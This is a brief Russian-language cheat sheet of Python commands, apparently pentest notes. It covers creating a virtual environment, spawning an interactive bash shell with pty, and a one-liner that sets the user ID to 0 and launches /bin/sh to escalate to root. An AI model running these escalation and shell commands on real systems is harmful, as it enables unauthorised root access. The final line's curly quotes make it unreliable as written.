# Python

# Активировать виртуальную среду


python3 -m venv venv

source venv/bin/activate

# получение виртуальной оболочки внутри текущей сессии

python3 -c 'import pty;pty.spawn("/bin/bash")'

python -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

# выполнение команд оси

./python3.8 -c “import os; os.setuid(0), os.system(‘/bin/sh’)”
